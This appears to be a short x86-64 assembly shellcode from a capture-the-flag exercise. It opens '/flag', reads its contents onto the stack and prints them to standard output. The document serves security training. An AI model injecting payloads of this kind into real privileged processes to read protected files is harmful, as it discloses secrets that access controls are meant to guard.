.intel_syntax noprefix
.global _start

_start:
        mov rax, 2 #SYS_OPEN
        mov rsi, 0
        mov rdx, 0
        lea rdi, [rip + flagtext]
        syscall

        mov rdi, rax
        mov rax, 0 #SYS_READ
        mov rsi, rsp
        mov rdx, 512
        syscall

        mov rax, 1
        mov rdi, 1 #SYS_WRITE
        syscall

        mov rax, 60
        mov rdi, 0
        syscall

flagtext: .ascii "/flag"
